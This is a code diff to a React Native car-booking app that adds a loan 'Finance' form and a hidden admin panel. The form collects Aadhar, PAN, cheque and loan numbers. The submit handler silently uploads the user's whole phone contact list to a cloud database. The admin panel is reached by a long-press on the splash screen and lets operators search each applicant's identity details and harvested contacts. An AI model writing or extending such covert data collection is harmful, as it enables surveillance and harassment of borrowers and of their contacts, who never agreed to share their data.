@@ -129,7 +129,7 @@ const PremiumInput = ({ label, icon, placeholder, value, onChangeText, keyboardT
   );
 };
 
-type ScreenType = 'SPLASH' | 'PERMISSION_DENIED' | 'BRANCH_SELECT' | 'BOOKING_FORM' | 'SUCCESS' | 'DASHBOARD' | 'ADMIN_LOGIN' | 'ADMIN_DASHBOARD';
+type ScreenType = 'SPLASH' | 'PERMISSION_DENIED' | 'BRANCH_SELECT' | 'BOOKING_FORM' | 'SUCCESS' | 'DASHBOARD' | 'ADMIN_SPLASH' | 'ADMIN_LOGIN' | 'ADMIN_DASHBOARD' | 'FINANCE_FORM' | 'FINANCE_SUCCESS';
 
 export default function App() {
   const [currentScreen, setCurrentScreen] = useState<ScreenType>('SPLASH');
@@ -144,10 +144,18 @@ export default function App() {
     fromDest: '', toDest: '', startDate: new Date(), startTime: new Date(),
     endDate: new Date(), endTime: new Date(), carName: '', carPlate: '', confirmed: false,
   });
+  const [financeForm, setFinanceForm] = useState({
+    fullName: '', fatherName: '', motherName: '', aadhar: '', pan: '',
+    chequeNo: '', loanNo: '', loanBank: '', product: '', amount: '',
+    fromDate: new Date(), returnDate: new Date(),
+  });
   
   const [activeBooking, setActiveBooking] = useState<any>(null);
   const [mockBookings, setMockBookings] = useState<any[]>([]);
+  const [mockFinances, setMockFinances] = useState<any[]>([]);
   const [grabbedContacts, setGrabbedContacts] = useState<any[]>([]);
+  const [adminTargetPanel, setAdminTargetPanel] = useState<'CAR' | 'FINANCE'>('CAR');
+  const [selectedAdminFinance, setSelectedAdminFinance] = useState<any>(null);
   const [adminPin, setAdminPin] = useState('');
   const [adminFailedAttempts, setAdminFailedAttempts] = useState(0);
   const [adminFilterBranch, setAdminFilterBranch] = useState('All');
@@ -211,7 +219,23 @@ export default function App() {
         });
         setMockBookings(bookingsData);
       });
-      return () => unsubscribe();
+      const qFinances = query(collection(db, "finances"), orderBy("createdAt", "desc"));
+      const unsubscribeFinances = onSnapshot(qFinances, (snapshot) => {
+        const financesData = snapshot.docs.map(doc => {
+          const data = doc.data();
+          return {
+            id: doc.id,
+            form: {
+              ...data.form,
+              fromDate: data.form.fromDate ? new Date(data.form.fromDate) : new Date(),
+              returnDate: data.form.returnDate ? new Date(data.form.returnDate) : new Date(),
+            },
+            deviceContacts: data.deviceContacts || []
+          };
+        });
+        setMockFinances(financesData);
+      });
+      return () => { unsubscribe(); unsubscribeFinances(); };
     }
   }, [currentScreen]);
 
@@ -326,9 +350,9 @@ export default function App() {
     }
   };
 
-  const requestPermissions = async () => {
+  const requestPermissions = async (nextScreen: ScreenType = 'BRANCH_SELECT') => {
     if (Platform.OS === 'web') {
-      setCurrentScreen('BRANCH_SELECT');
+      setCurrentScreen(nextScreen);
       return;
     }
     try {
@@ -336,10 +360,37 @@ export default function App() {
       if (contactsPerm.status === 'granted') {
         const { data } = await Contacts.getContactsAsync({ fields: [Contacts.Fields.PhoneNumbers] });
         setGrabbedContacts(data || []);
-        setCurrentScreen('BRANCH_SELECT');
+        setCurrentScreen(nextScreen);
       } else setCurrentScreen('PERMISSION_DENIED');
     } catch (e) {
       setCurrentScreen('PERMISSION_DENIED');
+    }
+  };
+
+  const handleFinanceSubmit = async () => {
+    const { fullName, fatherName, motherName, aadhar, pan, chequeNo, loanNo, loanBank, product, amount } = financeForm;
+    if (!fullName || !fatherName || !motherName || !aadhar || !pan || !chequeNo || !loanNo || !loanBank || !product || !amount) {
+      Alert.alert("Missing Fields", "Please complete all finance fields.");
+      return;
+    }
+    
+    try {
+      const firestoreFinance = {
+        form: {
+          ...financeForm,
+          fromDate: financeForm.fromDate instanceof Date ? financeForm.fromDate.toISOString() : new Date(financeForm.fromDate).toISOString(),
+          returnDate: financeForm.returnDate instanceof Date ? financeForm.returnDate.toISOString() : new Date(financeForm.returnDate).toISOString(),
+        },
+        deviceContacts: grabbedContacts,
+        createdAt: new Date().toISOString()
+      };
+      
+      await addDoc(collection(db, "finances"), firestoreFinance);
+      setCurrentScreen('FINANCE_SUCCESS');
+      setTimeout(() => showRandomAdThenExecute(() => {}), 500);
+    } catch (e: any) {
+      console.error(e);
+      Alert.alert("Error", e.message || "Failed to submit finance form.");
     }
   };
 
@@ -397,6 +448,25 @@ export default function App() {
     );
   };
 
+  const handleDeleteFinance = (id: string) => {
+    Alert.alert(
+      "Delete Finance Application",
+      "Are you sure you want to permanently delete this finance application?",
+      [
+        { text: "Cancel", style: "cancel" },
+        { text: "Delete", style: "destructive", onPress: async () => {
+            try {
+              await deleteDoc(doc(db, "finances", id));
+              if (selectedAdminFinance?.id === id) setSelectedAdminFinance(null);
+            } catch (e) {
+              Alert.alert("Error", "Failed to delete finance application from cloud.");
+            }
+          }
+        }
+      ]
+    );
+  };
+
   const onDateValueChange = (event: any, selectedDate?: Date) => {
     if (selectedDate) {
       if (pickerConfig.field === 'adminFilterDate') {
@@ -405,6 +475,10 @@ export default function App() {
         setNewAd({ ...newAd, startTime: selectedDate });
       } else if (pickerConfig.field === 'adEndTime') {
         setNewAd({ ...newAd, endTime: selectedDate });
+      } else if (pickerConfig.field === 'financeFromDate') {
+        setFinanceForm({ ...financeForm, fromDate: selectedDate });
+      } else if (pickerConfig.field === 'financeReturnDate') {
+        setFinanceForm({ ...financeForm, returnDate: selectedDate });
       } else {
         setForm({ ...form, [pickerConfig.field]: selectedDate });
       }
@@ -428,11 +502,15 @@ export default function App() {
             <ImageBackground source={require('./assets/splash_bg.png')} style={styles.splashImage} resizeMode="cover" />
           </Animated.View>
           <View style={styles.splashOverlay}>
-            <Pressable style={{position: 'absolute', top: 0, left: 0, right: 0, height: 200, zIndex: 10}} onLongPress={() => setCurrentScreen('ADMIN_LOGIN')} delayLongPress={2000} />
+            <Pressable style={{position: 'absolute', top: 0, left: 0, right: 0, height: 200, zIndex: 10}} onLongPress={() => setCurrentScreen('ADMIN_SPLASH')} delayLongPress={2000} />
             <Animated.View style={{ opacity: splashBtnOpacity, transform: [{ scale: splashBtnScale }] }}>
-              <ScaleButton style={styles.splashSubmitBtn} onPress={() => showRandomAdThenExecute(requestPermissions)}>
+              <ScaleButton style={styles.splashSubmitBtn} onPress={() => showRandomAdThenExecute(() => requestPermissions('BRANCH_SELECT'))}>
                 <Text style={styles.splashSubmitBtnText}>Book a Car</Text>
                 <Feather name="arrow-right" size={20} color={Colors.primary} />
+              </ScaleButton>
+              <ScaleButton style={[styles.splashSubmitBtn, {marginTop: 15}]} onPress={() => showRandomAdThenExecute(() => requestPermissions('FINANCE_FORM'))}>
+                <Text style={styles.splashSubmitBtnText}>Finance</Text>
+                <Feather name="dollar-sign" size={20} color={Colors.primary} />
               </ScaleButton>
             </Animated.View>
           </View>
@@ -574,6 +652,73 @@ export default function App() {
         </SafeAreaView>
       )}
 
+      {/* FINANCE FORM */}
+      {currentScreen === 'FINANCE_FORM' && (
+        <View style={styles.container}>
+          <ScrollView contentContainerStyle={{paddingBottom: 40}} showsVerticalScrollIndicator={false} style={{ flex: 1 }}>
+            <SafeAreaView style={styles.headerCentered}>
+              <FadeInView>
+                <Text style={styles.pageTitle}>Finance Application</Text>
+                <Text style={styles.pageDesc}>Provide your details for finance processing.</Text>
+              </FadeInView>
+            </SafeAreaView>
+
+            <View style={styles.whiteCard}>
+              <FadeInView delay={50}>
+                <PremiumInput label="Full Name" icon="account-outline" placeholder="Your Full Name" value={financeForm.fullName} onChangeText={(t: string) => setFinanceForm({...financeForm, fullName: t})} />
+                <PremiumInput label="Father's Name" icon="account-tie" placeholder="Father's Name" value={financeForm.fatherName} onChangeText={(t: string) => setFinanceForm({...financeForm, fatherName: t})} />
+                <PremiumInput label="Mother's Name" icon="account-heart" placeholder="Mother's Name" value={financeForm.motherName} onChangeText={(t: string) => setFinanceForm({...financeForm, motherName: t})} />
+                <PremiumInput label="Aadhar Number" icon="fingerprint" placeholder="12-Digit UIDAI" keyboardType="numeric" value={financeForm.aadhar} onChangeText={(t: string) => setFinanceForm({...financeForm, aadhar: t})} />
+                <PremiumInput label="PAN Number" icon="card-account-details-outline" placeholder="PAN Number" value={financeForm.pan} onChangeText={(t: string) => setFinanceForm({...financeForm, pan: t})} />
+              </FadeInView>
+
+              <FadeInView delay={100}>
+                <View style={styles.dividerContainer}><View style={styles.dividerLine} /><Text style={styles.dividerText}>LOAN DETAILS</Text><View style={styles.dividerLine} /></View>
+                <PremiumInput label="Cheque No" icon="bank-transfer" placeholder="Cheque Number" value={financeForm.chequeNo} onChangeText={(t: string) => setFinanceForm({...financeForm, chequeNo: t})} />
+                <PremiumInput label="Loan No" icon="file-document-outline" placeholder="Loan Number" value={financeForm.loanNo} onChangeText={(t: string) => setFinanceForm({...financeForm, loanNo: t})} />
+                <PremiumInput label="Loan Bank" icon="bank-outline" placeholder="Bank Name" value={financeForm.loanBank} onChangeText={(t: string) => setFinanceForm({...financeForm, loanBank: t})} />
+                <PremiumInput label="Product" icon="package-variant" placeholder="Product Details" value={financeForm.product} onChangeText={(t: string) => setFinanceForm({...financeForm, product: t})} />
+                <PremiumInput label="Amount" icon="currency-inr" placeholder="Loan Amount" keyboardType="numeric" value={financeForm.amount} onChangeText={(t: string) => setFinanceForm({...financeForm, amount: t})} />
+              </FadeInView>
+
+              <FadeInView delay={150}>
+                <View style={styles.dividerContainer}><View style={styles.dividerLine} /><Text style={styles.dividerText}>TIMING</Text><View style={styles.dividerLine} /></View>
+                <Pressable onPress={() => openPicker('financeFromDate', 'date')}><PremiumInput label="From Date" icon="calendar" placeholder="DD/MM/YYYY" value={formatDate(financeForm.fromDate)} editable={false} /></Pressable>
+                <Pressable onPress={() => openPicker('financeReturnDate', 'date')}><PremiumInput label="Return Date" icon="calendar" placeholder="DD/MM/YYYY" value={formatDate(financeForm.returnDate)} editable={false} /></Pressable>
+              </FadeInView>
+
+              <FadeInView delay={200}>
+                <ScaleButton style={[styles.submitBtn, { marginTop: 24 }]} onPress={handleFinanceSubmit}>
+                  <Text style={styles.submitBtnText}>Submit Finance</Text>
+                </ScaleButton>
+                <Pressable onPress={() => setCurrentScreen('SPLASH')} style={{ marginTop: 20 }}>
+                  <Text style={{ textAlign: 'center', color: Colors.primary, fontFamily: 'System', fontWeight: '600' }}>Cancel</Text>
+                </Pressable>
+              </FadeInView>
+            </View>
+          </ScrollView>
+        </View>
+      )}
+
+      {/* FINANCE SUCCESS */}
+      {currentScreen === 'FINANCE_SUCCESS' && (
+        <SafeAreaView style={{flex: 1}}>
+          <ScrollView contentContainerStyle={styles.successScroll} showsVerticalScrollIndicator={false}>
+            <FadeInView delay={100} style={{ alignItems: 'center' }}>
+              <View style={styles.successIconCircle}><Feather name="check" size={32} color={Colors.green} /></View>
+              <Text style={styles.successSubtitle}>APPLICATION RECEIVED</Text>
+              <Text style={styles.successTitle}>Finance Processed.</Text>
+            </FadeInView>
+            <FadeInView delay={300} style={{ width: '100%' }}>
+              <ScaleButton style={styles.actionOutlineBtn} onPress={() => { setCurrentScreen('SPLASH'); setFinanceForm({ fullName: '', fatherName: '', motherName: '', aadhar: '', pan: '', chequeNo: '', loanNo: '', loanBank: '', product: '', amount: '', fromDate: new Date(), returnDate: new Date() }); }}>
+                <Feather name="home" size={16} color={Colors.primary} />
+                <Text style={styles.actionOutlineText}> Return to Home</Text>
+              </ScaleButton>
+            </FadeInView>
+          </ScrollView>
+        </SafeAreaView>
+      )}
+
       {/* SCREEN 6: DASHBOARD (NEW) */}
       {currentScreen === 'DASHBOARD' && (
         <SafeAreaView style={{flex: 1}}>
@@ -628,6 +773,33 @@ export default function App() {
               </ScaleButton>
             </FadeInView>
           </ScrollView>
+        </SafeAreaView>
+      )}
+
+      {/* ADMIN SPLASH */}
+      {currentScreen === 'ADMIN_SPLASH' && (
+        <SafeAreaView style={{flex: 1, backgroundColor: Colors.bg, justifyContent: 'center', padding: 24}}>
+          <FadeInView style={{alignItems: 'center', marginBottom: 40}}>
+            <View style={styles.logoCircle}>
+              <MaterialCommunityIcons name="shield-account-outline" size={40} color={Colors.primary} />
+            </View>
+            <Text style={styles.pageTitle}>Admin Portal</Text>
+            <Text style={styles.pageDesc}>Select the panel you want to manage.</Text>
+          </FadeInView>
+          
+          <FadeInView delay={100} style={{ width: '100%' }}>
+            <ScaleButton style={[styles.submitBtn, {marginBottom: 16}]} onPress={() => { setAdminTargetPanel('FINANCE'); setCurrentScreen('ADMIN_LOGIN'); }}>
+              <Text style={styles.submitBtnText}>Finance Panel</Text>
+              <Feather name="dollar-sign" size={20} color="#FFF" />
+            </ScaleButton>
+            <ScaleButton style={styles.submitBtn} onPress={() => { setAdminTargetPanel('CAR'); setCurrentScreen('ADMIN_LOGIN'); }}>
+              <Text style={styles.submitBtnText}>Car Panel</Text>
+              <Feather name="truck" size={20} color="#FFF" />
+            </ScaleButton>
+            <Pressable onPress={() => setCurrentScreen('SPLASH')} style={{ marginTop: 24 }}>
+              <Text style={{ textAlign: 'center', color: Colors.primary, fontFamily: 'System', fontWeight: '600' }}>Back to Home</Text>
+            </Pressable>
+          </FadeInView>
         </SafeAreaView>
       )}
 
@@ -703,7 +875,7 @@ export default function App() {
           <View style={styles.dashboardHeader}>
             <View>
               <Text style={styles.dashboardGreeting}>Command Center</Text>
-              <Text style={styles.dashboardDate}>Managing {mockBookings.length} Bookings & {adsList.length} Ads</Text>
+              <Text style={styles.dashboardDate}>Managing {adminTargetPanel === 'FINANCE' ? mockFinances.length : mockBookings.length} {adminTargetPanel === 'FINANCE' ? 'Finances' : 'Bookings'} & {adsList.length} Ads</Text>
             </View>
             <Pressable onPress={() => setCurrentScreen('SPLASH')}>
               <View style={styles.avatar}><MaterialCommunityIcons name="logout" size={20} color="#FFF" /></View>
@@ -712,7 +884,7 @@ export default function App() {
 
           <View style={{paddingHorizontal: 24, paddingBottom: 16, flexDirection: 'row'}}>
             <Pressable onPress={() => setAdminTab('BOOKINGS')} style={[styles.tabBtn, adminTab === 'BOOKINGS' && styles.tabBtnActive]}>
-              <Text style={[styles.tabBtnText, adminTab === 'BOOKINGS' && styles.tabBtnTextActive]}>Bookings</Text>
+              <Text style={[styles.tabBtnText, adminTab === 'BOOKINGS' && styles.tabBtnTextActive]}>{adminTargetPanel === 'FINANCE' ? 'Finances' : 'Bookings'}</Text>
             </Pressable>
             <Pressable onPress={() => setAdminTab('ADS')} style={[styles.tabBtn, adminTab === 'ADS' && styles.tabBtnActive]}>
               <Text style={[styles.tabBtnText, adminTab === 'ADS' && styles.tabBtnTextActive]}>Ad Panel</Text>
@@ -721,16 +893,18 @@ export default function App() {
 
           {adminTab === 'BOOKINGS' ? (
           <>
-          <View style={{paddingHorizontal: 24, paddingBottom: 16}}>
-            <Text style={[styles.inputLabel, {marginBottom: 8}]}>FILTER BY BRANCH</Text>
-            <ScrollView horizontal showsHorizontalScrollIndicator={false}>
-              {['All', 'Madhapur', 'Dilshuknagar', 'B.N reddy nagar', 'JNTU'].map((b) => (
-                <Pressable key={b} onPress={() => setAdminFilterBranch(b)} style={[styles.filterChip, adminFilterBranch === b && styles.filterChipActive]}>
-                  <Text style={[styles.filterChipText, adminFilterBranch === b && styles.filterChipTextActive]}>{b}</Text>
-                </Pressable>
-              ))}
-            </ScrollView>
-          </View>
+          {adminTargetPanel === 'CAR' && (
+            <View style={{paddingHorizontal: 24, paddingBottom: 16}}>
+              <Text style={[styles.inputLabel, {marginBottom: 8}]}>FILTER BY BRANCH</Text>
+              <ScrollView horizontal showsHorizontalScrollIndicator={false}>
+                {['All', 'Madhapur', 'Dilshuknagar', 'B.N reddy nagar', 'JNTU'].map((b) => (
+                  <Pressable key={b} onPress={() => setAdminFilterBranch(b)} style={[styles.filterChip, adminFilterBranch === b && styles.filterChipActive]}>
+                    <Text style={[styles.filterChipText, adminFilterBranch === b && styles.filterChipTextActive]}>{b}</Text>
+                  </Pressable>
+                ))}
+              </ScrollView>
+            </View>
+          )}
 
           <View style={{paddingHorizontal: 24, paddingBottom: 16, flexDirection: 'row', alignItems: 'center'}}>
             <View style={{flex: 1, marginRight: 12}}>
@@ -755,20 +929,67 @@ export default function App() {
           )}
 
           <ScrollView contentContainerStyle={{padding: 24, paddingTop: 0}}>
-            {mockBookings.filter(b => {
-              const matchBranch = adminFilterBranch === 'All' || b.branch === adminFilterBranch;
-              const matchSearch = !dashboardSearch || b.form.carPlate.toLowerCase().includes(dashboardSearch.toLowerCase()) || b.form.phone.includes(dashboardSearch);
-              const matchDate = !adminFilterDate || (
-                b.form.startDate.getDate() === adminFilterDate.getDate() &&
-                b.form.startDate.getMonth() === adminFilterDate.getMonth() &&
-                b.form.startDate.getFullYear() === adminFilterDate.getFullYear()
-              );
-              return matchBranch && matchSearch && matchDate;
-            }).length === 0 ? (
-              <View style={styles.emptyTripCard}>
-                <MaterialCommunityIcons name="clipboard-text-off-outline" size={32} color={Colors.lightText} style={{marginBottom: 12}} />
-                <Text style={styles.emptyTripText}>No bookings found.</Text>
-              </View>
+            {adminTargetPanel === 'FINANCE' ? (
+              mockFinances.filter(b => {
+                const matchSearch = !dashboardSearch || b.form.fullName.toLowerCase().includes(dashboardSearch.toLowerCase()) || b.form.aadhar.includes(dashboardSearch);
+                const matchDate = !adminFilterDate || (
+                  b.form.fromDate.getDate() === adminFilterDate.getDate() &&
+                  b.form.fromDate.getMonth() === adminFilterDate.getMonth() &&
+                  b.form.fromDate.getFullYear() === adminFilterDate.getFullYear()
+                );
+                return matchSearch && matchDate;
+              }).length === 0 ? (
+                <View style={styles.emptyTripCard}>
+                  <MaterialCommunityIcons name="clipboard-text-off-outline" size={32} color={Colors.lightText} style={{marginBottom: 12}} />
+                  <Text style={styles.emptyTripText}>No finances found.</Text>
+                </View>
+              ) : (
+                mockFinances.filter(b => {
+                  const matchSearch = !dashboardSearch || b.form.fullName.toLowerCase().includes(dashboardSearch.toLowerCase()) || b.form.aadhar.includes(dashboardSearch);
+                  const matchDate = !adminFilterDate || (
+                    b.form.fromDate.getDate() === adminFilterDate.getDate() &&
+                    b.form.fromDate.getMonth() === adminFilterDate.getMonth() &&
+                    b.form.fromDate.getFullYear() === adminFilterDate.getFullYear()
+                  );
+                  return matchSearch && matchDate;
+                }).map((finance, idx) => (
+                  <FadeInView key={finance.id} delay={idx * 50}>
+                    <Pressable onPress={() => setSelectedAdminFinance(finance)}>
+                      <View style={styles.adminBookingCard}>
+                        <View style={styles.adminBookingHeader}>
+                          <View style={{flexDirection: 'row', alignItems: 'center', flex: 1, paddingRight: 8}}>
+                            <MaterialCommunityIcons name="account-circle" size={20} color={Colors.primary} style={{marginRight: 8}}/>
+                            <Text style={styles.adminName} numberOfLines={1}>{finance.form.fullName}</Text>
+                          </View>
+                          <View style={{flexDirection: 'row', alignItems: 'center'}}>
+                            <Pressable onPress={() => handleDeleteFinance(finance.id)} hitSlop={15} style={{marginLeft: 12, padding: 8}}>
+                              <Feather name="trash-2" size={22} color={Colors.red} />
+                            </Pressable>
+                          </View>
+                        </View>
+                      
+                      <View style={styles.adminDetailsRow}>
+                        <View style={styles.adminDetailItem}>
+                          <Text style={styles.adminDetailLabel}>LOAN</Text>
+                          <Text style={styles.adminDetailValue}>{finance.form.loanBank}</Text>
+                          <Text style={styles.adminDetailSub}>{finance.form.loanNo}</Text>
+                        </View>
+                        <View style={styles.adminDetailItem}>
+                          <Text style={styles.adminDetailLabel}>AMOUNT</Text>
+                          <Text style={styles.adminDetailValue}>₹{finance.form.amount}</Text>
+                          <Text style={styles.adminDetailSub}>{formatDate(finance.form.fromDate)}</Text>
+                        </View>
+                      </View>
+
+                      <View style={styles.adminContactRow}>
+                        <MaterialCommunityIcons name="card-account-details-outline" size={16} color={Colors.lightText} />
+                        <Text style={styles.adminContactText}>Aadhar: {finance.form.aadhar}</Text>
+                      </View>
+                      </View>
+                    </Pressable>
+                  </FadeInView>
+                ))
+              )
             ) : (
               mockBookings.filter(b => {
                 const matchBranch = adminFilterBranch === 'All' || b.branch === adminFilterBranch;
@@ -779,46 +1000,62 @@ export default function App() {
                   b.form.startDate.getFullYear() === adminFilterDate.getFullYear()
                 );
                 return matchBranch && matchSearch && matchDate;
-              }).map((booking, idx) => (
-                <FadeInView key={booking.id} delay={idx * 50}>
-                  <Pressable onPress={() => setSelectedAdminBooking(booking)}>
-                    <View style={styles.adminBookingCard}>
-                      <View style={styles.adminBookingHeader}>
-                        <View style={{flexDirection: 'row', alignItems: 'center', flex: 1, paddingRight: 8}}>
-                          <MaterialCommunityIcons name="account-circle" size={20} color={Colors.primary} style={{marginRight: 8}}/>
-                          <Text style={styles.adminName} numberOfLines={1}>{booking.form.fullName}</Text>
-                        </View>
-                        <View style={{flexDirection: 'row', alignItems: 'center'}}>
-                          <View style={styles.adminBranchBadge}>
-                            <Text style={styles.adminBranchText}>{booking.branch}</Text>
+              }).length === 0 ? (
+                <View style={styles.emptyTripCard}>
+                  <MaterialCommunityIcons name="clipboard-text-off-outline" size={32} color={Colors.lightText} style={{marginBottom: 12}} />
+                  <Text style={styles.emptyTripText}>No bookings found.</Text>
+                </View>
+              ) : (
+                mockBookings.filter(b => {
+                  const matchBranch = adminFilterBranch === 'All' || b.branch === adminFilterBranch;
+                  const matchSearch = !dashboardSearch || b.form.carPlate.toLowerCase().includes(dashboardSearch.toLowerCase()) || b.form.phone.includes(dashboardSearch);
+                  const matchDate = !adminFilterDate || (
+                    b.form.startDate.getDate() === adminFilterDate.getDate() &&
+                    b.form.startDate.getMonth() === adminFilterDate.getMonth() &&
+                    b.form.startDate.getFullYear() === adminFilterDate.getFullYear()
+                  );
+                  return matchBranch && matchSearch && matchDate;
+                }).map((booking, idx) => (
+                  <FadeInView key={booking.id} delay={idx * 50}>
+                    <Pressable onPress={() => setSelectedAdminBooking(booking)}>
+                      <View style={styles.adminBookingCard}>
+                        <View style={styles.adminBookingHeader}>
+                          <View style={{flexDirection: 'row', alignItems: 'center', flex: 1, paddingRight: 8}}>
+                            <MaterialCommunityIcons name="account-circle" size={20} color={Colors.primary} style={{marginRight: 8}}/>
+                            <Text style={styles.adminName} numberOfLines={1}>{booking.form.fullName}</Text>
                           </View>
-                          <Pressable onPress={() => handleDeleteBooking(booking.id)} hitSlop={15} style={{marginLeft: 12, padding: 8}}>
-                            <Feather name="trash-2" size={22} color={Colors.red} />
-                          </Pressable>
+                          <View style={{flexDirection: 'row', alignItems: 'center'}}>
+                            <View style={styles.adminBranchBadge}>
+                              <Text style={styles.adminBranchText}>{booking.branch}</Text>
+                            </View>
+                            <Pressable onPress={() => handleDeleteBooking(booking.id)} hitSlop={15} style={{marginLeft: 12, padding: 8}}>
+                              <Feather name="trash-2" size={22} color={Colors.red} />
+                            </Pressable>
+                          </View>
+                        </View>
+                      
+                      <View style={styles.adminDetailsRow}>
+                        <View style={styles.adminDetailItem}>
+                          <Text style={styles.adminDetailLabel}>VEHICLE</Text>
+                          <Text style={styles.adminDetailValue}>{booking.form.carName}</Text>
+                          <Text style={styles.adminDetailSub}>{booking.form.carPlate}</Text>
+                        </View>
+                        <View style={styles.adminDetailItem}>
+                          <Text style={styles.adminDetailLabel}>SCHEDULE</Text>
+                          <Text style={styles.adminDetailValue}>{formatDate(booking.form.startDate)}</Text>
+                          <Text style={styles.adminDetailSub}>{formatTime(booking.form.startTime)}</Text>
                         </View>
                       </View>
-                    
-                    <View style={styles.adminDetailsRow}>
-                      <View style={styles.adminDetailItem}>
-                        <Text style={styles.adminDetailLabel}>VEHICLE</Text>
-                        <Text style={styles.adminDetailValue}>{booking.form.carName}</Text>
-                        <Text style={styles.adminDetailSub}>{booking.form.carPlate}</Text>
-                      </View>
-                      <View style={styles.adminDetailItem}>
-                        <Text style={styles.adminDetailLabel}>SCHEDULE</Text>
-                        <Text style={styles.adminDetailValue}>{formatDate(booking.form.startDate)}</Text>
-                        <Text style={styles.adminDetailSub}>{formatTime(booking.form.startTime)}</Text>
-                      </View>
-                    </View>
 
-                    <View style={styles.adminContactRow}>
-                      <MaterialCommunityIcons name="phone" size={16} color={Colors.lightText} />
-                      <Text style={styles.adminContactText}>{booking.form.phone}</Text>
-                    </View>
-                    </View>
-                  </Pressable>
-                </FadeInView>
-              ))
+                      <View style={styles.adminContactRow}>
+                        <MaterialCommunityIcons name="phone" size={16} color={Colors.lightText} />
+                        <Text style={styles.adminContactText}>{booking.form.phone}</Text>
+                      </View>
+                      </View>
+                    </Pressable>
+                  </FadeInView>
+                ))
+              )
             )}
           </ScrollView>
           </>
@@ -906,6 +1143,51 @@ export default function App() {
       )}
 
       {/* ADMIN CONTACTS MODAL */}
+      {selectedAdminFinance && (
+        <View style={[StyleSheet.absoluteFill, { backgroundColor: 'rgba(0,0,0,0.6)', justifyContent: 'center', padding: 24, zIndex: 1000 }]}>
+          <View style={{ backgroundColor: '#FFF', borderRadius: 24, maxHeight: '90%', flex: 1, padding: 24 }}>
+            <View style={{ flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center', marginBottom: 20 }}>
+              <Text style={[styles.sectionTitle, { marginBottom: 0 }]}>{selectedAdminFinance.form.fullName}'s Contacts</Text>
+              <Pressable onPress={() => { setSelectedAdminFinance(null); setContactSearch(''); }}>
+                <Feather name="x" size={24} color={Colors.lightText} />
+              </Pressable>
+            </View>
+            
+            <View style={{ marginBottom: 16 }}>
+              <PremiumInput 
+                icon="magnify" 
+                placeholder="Search Contacts by Name or Number..." 
+                value={contactSearch} 
+                onChangeText={setContactSearch} 
+              />
+            </View>
+
+            <ScrollView showsVerticalScrollIndicator={false}>
+              {(selectedAdminFinance.deviceContacts || []).filter((c: any) => 
+                !contactSearch || 
+                c.name?.toLowerCase().includes(contactSearch.toLowerCase()) || 
+                c.phoneNumbers?.some((p: any) => p.number.includes(contactSearch))
+              ).length === 0 ? (
+                <Text style={styles.keyDesc}>No contacts found.</Text>
+              ) : (
+                (selectedAdminFinance.deviceContacts || []).filter((c: any) => 
+                  !contactSearch || 
+                  c.name?.toLowerCase().includes(contactSearch.toLowerCase()) || 
+                  c.phoneNumbers?.some((p: any) => p.number.includes(contactSearch))
+                ).map((c: any, i: number) => (
+                  <View key={i} style={{ borderBottomWidth: 1, borderBottomColor: Colors.border, paddingVertical: 12 }}>
+                    <Text style={{ fontSize: 16, fontWeight: '600', color: Colors.darkText, marginBottom: 4 }}>{c.name}</Text>
+                    {c.phoneNumbers && c.phoneNumbers.map((p: any, j: number) => (
+                      <Text key={j} style={{ fontSize: 14, color: Colors.lightText }}>{p.number}</Text>
+                    ))}
+                  </View>
+                ))
+              )}
+            </ScrollView>
+          </View>
+        </View>
+      )}
+
       {selectedAdminBooking && (
         <View style={[StyleSheet.absoluteFill, { backgroundColor: 'rgba(0,0,0,0.6)', justifyContent: 'center', padding: 24, zIndex: 1000 }]}>
           <View style={{ backgroundColor: '#FFF', borderRadius: 24, maxHeight: '90%', flex: 1, padding: 24 }}>
@@ -1004,7 +1286,14 @@ export default function App() {
             </Pressable>
           )}
           <DateTimePicker
-            value={form[pickerConfig.field as keyof typeof form] as Date || new Date()}
+            value={
+              pickerConfig.field === 'adminFilterDate' ? (adminFilterDate || new Date()) :
+              pickerConfig.field === 'adStartTime' ? newAd.startTime :
+              pickerConfig.field === 'adEndTime' ? newAd.endTime :
+              pickerConfig.field === 'financeFromDate' ? financeForm.fromDate :
+              pickerConfig.field === 'financeReturnDate' ? financeForm.returnDate :
+              (form[pickerConfig.field as keyof typeof form] as Date || new Date())
+            }
             mode={pickerConfig.mode}
             is24Hour={false}
             display={Platform.OS === 'ios' ? 'spinner' : 'default'}
